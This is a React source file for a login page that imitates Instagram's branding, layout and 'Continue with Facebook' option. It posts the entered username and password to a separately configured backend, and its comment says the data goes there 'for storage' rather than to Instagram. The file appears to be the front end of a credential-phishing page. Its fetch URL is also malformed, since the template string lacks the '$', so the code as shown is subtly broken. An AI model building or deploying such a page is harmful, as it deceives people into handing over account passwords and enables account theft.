// src/App.js

import React, { useState } from 'react';
import './App.css';

function App() {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });

  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleLogin = async () => {
    try {
      // Send the form data to the backend for storage
      const response = await fetch(`{process.env.REACT_APP_BACKEND_URL}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      const data = await response.json();

      if (data.success) {
        alert('Login successful');
      } else {
        alert('Login failed');
      }
    } catch (error) {
      console.error('Error during login:', error);
    }
  };

  return (
    <div className="App">
      <div className="login-container">
        <div className="instagram-word">Instagram</div>
        <div className="login-field">
          {/* <div className="login-icon">&#128311;</div> */}
          <div className="continue-text">Continue with Facebook</div>
        </div>
        <div className="or-line">
          <div className="or-text">OR</div>
        </div>
        <input
          type="text"
          name="username"
          placeholder="Phone number, username, or email"
          className="input-field"
          value={formData.username}
          onChange={handleInputChange}
        />
        <input
          type="password"
          name="password"
          placeholder="Password"
          className="input-field"
          value={formData.password}
          onChange={handleInputChange}
        />
        <div className="forgot-password">Forgot password?</div>
        <button className="login-button" onClick={handleLogin}>
          Log In
        </button>
        <div className="signup-text">
          Don't have an account? <strong>Sign up.</strong>{' '}
        </div>
      </div>
    </div>
  );
}

export default App;
